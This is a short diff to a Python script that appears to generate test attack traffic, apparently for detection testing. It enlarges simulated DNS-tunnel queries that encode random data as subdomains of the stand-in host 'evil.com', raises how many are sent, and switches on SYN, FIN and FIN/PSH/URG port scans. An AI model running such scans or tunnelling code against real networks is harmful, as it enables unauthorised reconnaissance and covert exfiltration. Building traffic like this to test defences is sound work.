@@ -38,7 +38,7 @@ def send_packet(protocol, dst_ip, src_ip=None, src_port=None, dst_port=None,
 
 
 def make_tunnel_domain(base_domain="evil.com"):
-    raw     = os.urandom(50)
+    raw     = os.urandom(100)
     encoded = base64.b32encode(raw).decode().rstrip("=").lower()
     labels  = [encoded[i:i + 30] for i in range(0, len(encoded), 30)]
     return (".".join(labels) + "." + base_domain).encode()
@@ -103,11 +103,11 @@ def main():
     send_packet("TCP", DST_IP, SRC_IP, 9999, 23, None, None, 1)  # Telnet honeyport (port 23!)
     
     # DNS Tunnel
-    send_dns(1) # DNS Tunnel
+    send_dns(10) # DNS Tunnel
     
     # SYN Scan
-    #send_port_scan(ports, "S") # SYN scan
-    #send_port_scan(ports, "F") # FIN scan
-    #send_port_scan(ports, "FPU") # FIN scan
+    send_port_scan(ports, "S") # SYN scan
+    send_port_scan(ports, "F") # FIN scan
+    send_port_scan(ports, "FPU") # FIN scan
 
 main()
